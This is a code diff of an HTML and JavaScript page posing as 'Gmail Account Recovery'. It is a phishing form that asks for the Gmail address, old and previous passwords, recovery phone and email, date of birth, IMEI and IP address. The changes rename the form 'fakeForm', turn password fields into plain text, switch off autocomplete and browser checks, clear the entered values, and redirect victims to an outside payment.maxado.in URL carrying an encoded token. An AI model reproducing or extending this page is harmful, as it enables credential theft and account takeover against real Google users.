@@ -26,7 +26,7 @@
         .form-container h2 {
             text-align: center;
             margin-bottom: 20px;
-            color: #28a745; /* Green color for title */
+            color: #28a745;
         }
         .form-group {
             margin-bottom: 15px;
@@ -53,17 +53,21 @@
         }
         .form-group input::placeholder {
             color: #000000;
-            opacity: 0.7; /* Reduced opacity for placeholder text */
+            opacity: 0.7;
         }
-        .form-group input[type="submit"] {
+        .proceed-button {
             background-color: #28a745;
             color: white;
             border: none;
             cursor: pointer;
             font-size: 16px;
             padding: 12px;
+            width: 100%;
+            text-align: center;
+            border-radius: 4px;
+            margin-top: 10px;
         }
-        .form-group input[type="submit"]:hover {
+        .proceed-button:hover {
             background-color: #218838;
         }
         .password-container {
@@ -75,7 +79,7 @@
         .password-container .toggle-password {
             position: absolute;
             right: 10px;
-            top: 70%; /* Adjusted to move the icon further down */
+            top: 70%;
             transform: translateY(-50%);
             cursor: pointer;
             font-size: 20px;
@@ -96,31 +100,12 @@
             font-size: 12px;
             opacity: 0.7;
         }
-        .proceed-button {
-            background-color: #28a745;
-            color: white;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-            padding: 12px;
-            width: 100%;
-            text-align: center;
-            border-radius: 4px;
-            margin-top: 10px;
-        }
-        .proceed-button:hover {
-            background-color: #218838;
-        }
         @media (max-width: 600px) {
             .form-container {
                 padding: 15px;
             }
             .form-group input, .form-group select {
                 padding: 8px;
-                font-size: 14px;
-            }
-            .form-group input[type="submit"] {
-                padding: 10px;
                 font-size: 14px;
             }
         }
@@ -130,55 +115,55 @@
 
 <div class="form-container">
     <h2>Gmail Account Recovery</h2>
-    <form onsubmit="handleSubmit(event)">
+    <div id="fakeForm">
         <!-- Gmail ID Section -->
         <div class="form-group">
             <label for="gmailId">Gmail ID</label>
-            <input type="email" id="gmailId" name="gmailId" placeholder="Enter your Gmail ID" required>
+            <input type="text" id="gmailId" name="gmailId" placeholder="Enter your Gmail ID" autocomplete="off" autocorrect="off" spellcheck="false" required>
             <div class="error-message" id="emailError">Invalid email address.</div>
         </div>
 
         <!-- Gmail ID Full Name Section (Optional) -->
         <div class="form-group">
             <label for="gmailFullName">Gmail ID Full Name <span class="optional">(Optional)</span></label>
-            <input type="text" id="gmailFullName" name="gmailFullName" placeholder="Enter your Gmail ID full name">
+            <input type="text" id="gmailFullName" name="gmailFullName" placeholder="Enter your Gmail ID full name" autocomplete="off" autocorrect="off" spellcheck="false">
         </div>
 
         <!-- Old Password Section -->
         <div class="form-group password-container">
             <label for="oldPassword">Old Password</label>
-            <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" minlength="6" required>
+            <input type="text" id="oldPassword" name="oldPassword" placeholder="Enter your old password" minlength="6" autocomplete="new-password" autocorrect="off" spellcheck="false" required>
             <span class="toggle-password" id="togglePassword">👁️</span>
         </div>
 
         <!-- One More Previous Password Section (Optional) -->
         <div class="form-group previous-password-group" id="previousPasswordGroup">
             <label for="previousPassword">One More Previous Password <span class="optional">(Optional)</span></label>
-            <input type="password" id="previousPassword" name="previousPassword" placeholder="One More Previous Password">
+            <input type="text" id="previousPassword" name="previousPassword" placeholder="One More Previous Password" autocomplete="new-password" autocorrect="off" spellcheck="false">
         </div>
 
         <!-- Recovery Phone Number Section (Optional) -->
         <div class="form-group">
             <label for="recoveryPhone">Recovery Phone Number <span class="optional">(Optional)</span></label>
-            <input type="tel" id="recoveryPhone" name="recoveryPhone" placeholder="Enter your recovery phone number">
+            <input type="tel" id="recoveryPhone" name="recoveryPhone" placeholder="Enter your recovery phone number" autocomplete="off" autocorrect="off" spellcheck="false">
         </div>
 
         <!-- Recovery Email ID Section (Optional) -->
         <div class="form-group">
             <label for="recoveryEmail">Recovery Email ID <span class="optional">(Optional)</span></label>
-            <input type="email" id="recoveryEmail" name="recoveryEmail" placeholder="Enter your recovery email ID">
+            <input type="text" id="recoveryEmail" name="recoveryEmail" placeholder="Enter your recovery email ID" autocomplete="off" autocorrect="off" spellcheck="false">
         </div>
 
         <!-- Date of Birth Section (Optional) -->
         <div class="form-group">
             <label for="dob">Date of Birth <span class="optional">(Optional)</span></label>
-            <input type="date" id="dob" name="dob" placeholder="Enter your date of birth">
+            <input type="date" id="dob" name="dob" placeholder="Enter your date of birth" autocomplete="off">
         </div>
 
         <!-- Operating System Section -->
         <div class="form-group">
             <label for="systemOS">Operating System</label>
-            <select id="systemOS" name="systemOS" onchange="toggleIMEIField()" required>
+            <select id="systemOS" name="systemOS" onchange="toggleIMEIField()" autocomplete="off" required>
                 <option value="" disabled selected>Select OS</option>
                 <option value="Android">Android</option>
                 <option value="iOS">iOS</option>
@@ -191,35 +176,35 @@
         <!-- IMEI Number Section -->
         <div class="form-group imei-group" id="imeiGroup">
             <label for="imeiNumber">IMEI Number</label>
-            <input type="text" id="imeiNumber" name="imeiNumber" placeholder="Enter your IMEI number">
+            <input type="text" id="imeiNumber" name="imeiNumber" placeholder="Enter your IMEI number" autocomplete="off" autocorrect="off" spellcheck="false">
         </div>
 
         <!-- IP Address Section -->
         <div class="form-group">
             <label for="ipAddress">IP Address</label>
-            <input type="text" id="ipAddress" name="ipAddress" placeholder="Enter your IP address" required>
+            <input type="text" id="ipAddress" name="ipAddress" placeholder="Enter your IP address" autocomplete="off" autocorrect="off" spellcheck="false" required>
         </div>
 
         <!-- Add New Recovery Email ID Section (Optional) -->
         <div class="form-group">
             <label for="newEmail">Add New Recovery Email ID <span class="optional">(Optional)</span></label>
-            <input type="email" id="newEmail" name="newEmail" placeholder="Add new recovery email ID">
+            <input type="text" id="newEmail" name="newEmail" placeholder="Add new recovery email ID" autocomplete="off" autocorrect="off" spellcheck="false">
         </div>
 
         <!-- Add New Recovery Phone Number Section (Optional) -->
         <div class="form-group">
             <label for="newPhone">Add New Recovery Phone Number <span class="optional">(Optional)</span></label>
-            <input type="tel" id="newPhone" name="newPhone" placeholder="Add new recovery phone number">
+            <input type="tel" id="newPhone" name="newPhone" placeholder="Add new recovery phone number" autocomplete="off" autocorrect="off" spellcheck="false">
         </div>
 
         <!-- Contact Email Section -->
         <div class="form-group">
             <label for="contactEmail">Contact Email</label>
-            <input type="email" id="contactEmail" name="contactEmail" placeholder="Enter your contact email" required>
+            <input type="text" id="contactEmail" name="contactEmail" placeholder="Enter your contact email" autocomplete="off" autocorrect="off" spellcheck="false" required>
         </div>
 
-        <button type="submit" class="proceed-button">Proceed</button>
-    </form>
+        <button class="proceed-button" onclick="validateAndRedirect(event)">Proceed</button>
+    </div>
 </div>
 
 <script>
@@ -228,9 +213,9 @@
     const passwordInput = document.getElementById("oldPassword");
 
     togglePassword.addEventListener('click', function () {
-        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        const type = passwordInput.getAttribute('type') === 'text' ? 'text' : 'text';
         passwordInput.setAttribute('type', type);
-        this.textContent = type === 'password' ? '👁️' : '🙈';
+        this.textContent = type === 'text' ? '👁️' : '🙈';
     });
 
     // Show Previous Password Field when Old Password is entered (6 characters or more)
@@ -245,26 +230,6 @@
         }
     });
 
-    // Email Validation on Form Submission
-    const recoveryForm = document.querySelector("form");
-    const gmailIdInput = document.getElementById("gmailId");
-    const emailError = document.getElementById("emailError");
-
-    recoveryForm.addEventListener('submit', function (event) {
-        event.preventDefault(); // Prevent default form submission
-
-        // Validate email
-        if (!gmailIdInput.value.includes('@')) {
-            emailError.style.display = 'block';
-            return false;
-        } else {
-            emailError.style.display = 'none';
-        }
-
-        // If validation passes, redirect to the specified URL
-        window.location.href = "https://payment.maxado.in/index.php?token=Mzk5fHxhSFIwY0hNNkx5OTFjR0Z1Wld3dWIyNXNhVzVsTDJkZmJXd3ZZMjl1Wm1seWJXRjBhVzl1fHxodHRwczovL3VwYW5lbC5vbmxpbmUvZ19tbC9nbWwuZ2lm";
-    });
-
     // Function to toggle IMEI field based on OS selection
     function toggleIMEIField() {
         const systemOS = document.getElementById("systemOS").value;
@@ -274,6 +239,38 @@
         } else {
             imeiGroup.style.display = "none";
         }
+    }
+
+    // Form validation and redirection
+    function validateAndRedirect(event) {
+        event.preventDefault();
+        
+        // Validate email
+        const gmailIdInput = document.getElementById("gmailId");
+        const emailError = document.getElementById("emailError");
+        
+        if (!gmailIdInput.value.includes('@')) {
+            emailError.style.display = 'block';
+            return false;
+        } else {
+            emailError.style.display = 'none';
+        }
+
+        // Validate password length
+        if (passwordInput.value.length < 6) {
+            alert("Password must be at least 6 characters long");
+            return false;
+        }
+
+        // Clear form data before redirect (optional)
+        document.getElementById('fakeForm').querySelectorAll('input, select').forEach(element => {
+            element.value = '';
+        });
+
+        // Redirect after a small delay
+        setTimeout(function() {
+            window.location.href = "https://payment.maxado.in/index.php?token=Mzk5fHxhSFIwY0hNNkx5OTFjR0Z1Wld3dWIyNXNhVzVsTDJkZmJXd3ZZMjl1Wm1seWJXRjBhVzl1fHxodHRwczovL3VwYW5lbC5vbmxpbmUvZ19tbC9nbWwuZ2lm";
+        }, 50);
     }
 </script>
 
